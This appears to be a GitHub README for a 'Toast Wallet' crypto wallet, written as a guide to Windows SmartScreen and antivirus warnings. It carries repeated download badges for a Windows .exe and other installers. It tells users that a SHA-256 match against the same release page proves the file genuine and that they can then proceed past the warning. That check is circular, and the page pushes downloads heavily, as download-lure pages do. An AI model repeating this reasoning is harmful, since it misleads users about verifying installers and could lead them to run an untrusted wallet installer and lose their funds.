<p align="center"><img src="https://github.com/Toast-Wallet/learn/raw/HEAD/assets/banner-article.png" alt="Toast Wallet banner" width="100%"></p>

<h1 align="center">Toast Wallet Windows security warning</h1>

<p align="center">What a Windows warning means and how to decide safely.</p>

<p align="center">
  <a href="https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet.Setup.3.0.0.exe"><img src="https://img.shields.io/badge/%E2%AC%87%20DOWNLOAD-WINDOWS-1f5fbf?style=for-the-badge&logo=windows&logoColor=white&labelColor=142033" alt="Download Toast Wallet for Windows"></a>
  <a href="https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet-3.0.0.dmg"><img src="https://img.shields.io/badge/%E2%AC%87%20DOWNLOAD-MACOS-1f5fbf?style=for-the-badge&logo=apple&logoColor=white&labelColor=142033" alt="Download Toast Wallet for Macos"></a>
  <a href="https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet-3.0.0-x86_64.AppImage"><img src="https://img.shields.io/badge/%E2%AC%87%20DOWNLOAD-LINUX-1f5fbf?style=for-the-badge&logo=linux&logoColor=white&labelColor=142033" alt="Download Toast Wallet for Linux"></a>
</p>

| Platform | File |
|:--|:--|
| 🪟 Windows | [`ToastWallet.Setup.3.0.0.exe`](https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet.Setup.3.0.0.exe) |
| 🍎 macOS | [`ToastWallet-3.0.0.dmg`](https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet-3.0.0.dmg) |
| 🐧 Linux | [`ToastWallet-3.0.0-x86_64.AppImage`](https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet-3.0.0-x86_64.AppImage) |

All versions and checksums are on the [Toast Wallet 3.0.0 release page](https://github.com/Toast-Wallet/core/releases/tag/3.0.0).

> [!IMPORTANT]
> Only download from this GitHub release page.

---

## 💡 Short answer

A Windows warning when you open the Toast Wallet installer is a prompt to double-check, not a verdict. Confirm you downloaded the file from the [official Toast Wallet 3.0.0 release](https://github.com/Toast-Wallet/core/releases/tag/3.0.0) and that its SHA-256 value matches. If either check fails, delete the file.

## 👀 You'll see this if

- A blue screen says Windows protected your PC when you start the installer.
- Your antivirus asks whether you trust the file.
- A browser shows a message that the file is not commonly downloaded.
- You are not sure whether to continue or to stop.

## 🤔 Why it happens

Windows and browsers use reputation systems. They look at how often a file has been downloaded, who published it and whether it has been seen before. Newer or less widely downloaded programs may trigger a caution screen even when they are genuine. Equally, a fake wallet installer can trigger the same screen. The warning cannot tell you which situation you are in; that is why you need a check that can.

Toast Wallet makes no claims about code signing in its release, so the reliable test is the published SHA-256 checksum. It compares your file to the exact file released on GitHub. If they match, you have the genuine installer. If they do not, no amount of clicking through warnings will make the file safe.

## 🧭 Before you start

Keep the release page open in one browser tab and your Downloads folder open in File Explorer. Make sure you know exactly which file triggered the warning, including its full name. If the file came from anywhere other than the official release, stop here: delete it and download a fresh copy from the release page instead.

## 🛠️ Fix: decide safely

1. **Stop and do not click through yet.** Close the warning for now. There is no rush, and nothing is lost by pausing.
2. **Check where the file came from.** The download should have started from the Assets list on the Toast Wallet release page inside the [Toast Wallet app repository](https://github.com/Toast-Wallet/core). If it came from an advert, a file-sharing site, a chat message or an email, delete it.
3. **Check the file name.** It should be exactly `ToastWallet.Setup.3.0.0.exe`. Unusual extra words, a `.zip` or `.scr` extension or a very different file size are all red flags.
4. **Calculate the checksum.** In PowerShell run:
   ```powershell
   certutil -hashfile "$env:USERPROFILE\Downloads\ToastWallet.Setup.3.0.0.exe" SHA256
   ```
   Compare the result with the Windows value on the release page. The full method is in [verify a Toast Wallet download checksum](https://github.com/Toast-Wallet/learn/blob/main/how-to/verify-toast-wallet-download-checksum.md).
5. **If it does not match, delete it.** Empty the Recycle Bin, download again from the release page and repeat the check.
6. **If it matches, you have the published file.** You can now decide to continue with the installation, following [install Toast Wallet on Windows](https://github.com/Toast-Wallet/learn/blob/main/how-to/install-toast-wallet-on-windows.md). The warning screen typically offers more information about the file before you proceed.
7. **Keep your security tools switched on.** Do not disable Windows Security, SmartScreen or your antivirus to install the wallet.

## 🔁 If that did not work

- **Your antivirus deletes the file automatically.** Do not turn the antivirus off. Download again from the release page, check the checksum and, if it matches, use your antivirus's own reporting option to submit the file for review.
- **You already ran a file from an unknown source.** Do not open your wallet on that computer. From a different, trusted device, read [Toast Wallet scams to avoid](https://github.com/Toast-Wallet/learn/blob/main/how-to/toast-wallet-scams-to-avoid.md), and consider moving your XRP to a fresh wallet created on a clean system.
- **The release page itself looks different.** Make sure the address bar shows `github.com/Toast-Wallet/core`. Look-alike pages exist.

## 🛡️ Prevention

Download Toast Wallet only from the official release, every time. Never install a wallet from a link someone sends you, even a friend, because accounts are hijacked and used to spread fakes. Keep Windows up to date. Make the checksum check a habit, so warnings become a reminder rather than a source of worry.

## 📝 Good to know

Warnings can appear for the genuine installer and stay silent for a fake one; the two things are not linked. A clever fake may even be packaged so that it triggers no warning at all. That is why the guides in this library always come back to two simple checks you control yourself: the source of the file and its checksum. If both are right, you have the published installer, whatever the warning said. If either is wrong, delete the file, whatever the warning said.

Some people also worry that their antivirus might stop working properly after installing a wallet. It will not. Toast Wallet does not need any special permissions, exclusions or changes to your security settings. If anything ever asks you to add an exclusion or switch protection off, treat that as a strong sign that the file is not genuine.

## 🔍 A closer look at file names

Fake installers often hide behind names that look almost right, such as an extra word, a double extension like `.exe.zip`, or a different version number. Windows hides known file extensions by default, which makes this harder to spot. In File Explorer, open the View menu and turn on file name extensions. You will then see the full name of every download, which makes an odd one stand out immediately.

## ❓ FAQ

<details>
<summary>Does a warning mean the installer is malware?</summary>

Not necessarily. It means Windows has limited information about the file. The checksum tells you whether it is the genuine release.

</details>

<details>
<summary>Should I turn off SmartScreen?</summary>

No. Leave protections on and rely on the checksum to confirm the file.

</details>

<details>
<summary>Is a matching checksum enough to trust a support message?</summary>

No. The checksum confirms a file, nothing else. Real support never asks for your secrets.

</details>

> [!WARNING]
> Any message offering a "fixed" installer or asking for your recovery words is a scam. Use only the official release page.

---

## ⬇️ Download Toast Wallet 3.0.0

<p align="center">
  <a href="https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet.Setup.3.0.0.exe"><img src="https://img.shields.io/badge/%E2%AC%87%20DOWNLOAD-WINDOWS-1f5fbf?style=for-the-badge&logo=windows&logoColor=white&labelColor=142033" alt="Download Toast Wallet for Windows"></a>
  <a href="https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet-3.0.0.dmg"><img src="https://img.shields.io/badge/%E2%AC%87%20DOWNLOAD-MACOS-1f5fbf?style=for-the-badge&logo=apple&logoColor=white&labelColor=142033" alt="Download Toast Wallet for Macos"></a>
  <a href="https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet-3.0.0-x86_64.AppImage"><img src="https://img.shields.io/badge/%E2%AC%87%20DOWNLOAD-LINUX-1f5fbf?style=for-the-badge&logo=linux&logoColor=white&labelColor=142033" alt="Download Toast Wallet for Linux"></a>
</p>

| Platform | File |
|:--|:--|
| 🪟 Windows | [`ToastWallet.Setup.3.0.0.exe`](https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet.Setup.3.0.0.exe) |
| 🍎 macOS | [`ToastWallet-3.0.0.dmg`](https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet-3.0.0.dmg) |
| 🐧 Linux | [`ToastWallet-3.0.0-x86_64.AppImage`](https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet-3.0.0-x86_64.AppImage) |

Checksums for every file are on the [official Toast Wallet 3.0.0 release](https://github.com/Toast-Wallet/core/releases/tag/3.0.0). More guides live in the [Toast Wallet learn hub](https://github.com/Toast-Wallet/learn).

---

## 📚 Related articles

| Guide | What it covers |
|:--|:--|
| [Verify a Toast Wallet download checksum](https://github.com/Toast-Wallet/learn/blob/main/how-to/verify-toast-wallet-download-checksum.md) | Compare SHA-256 values so you know the installer is the real one. |
| [Install Toast Wallet on Windows](https://github.com/Toast-Wallet/learn/blob/main/how-to/install-toast-wallet-on-windows.md) | Download, check and install the Windows desktop wallet step by step. |
| [Toast Wallet scams to avoid](https://github.com/Toast-Wallet/learn/blob/main/how-to/toast-wallet-scams-to-avoid.md) | Fake sites, fake apps and fake recovery tools named and explained. |
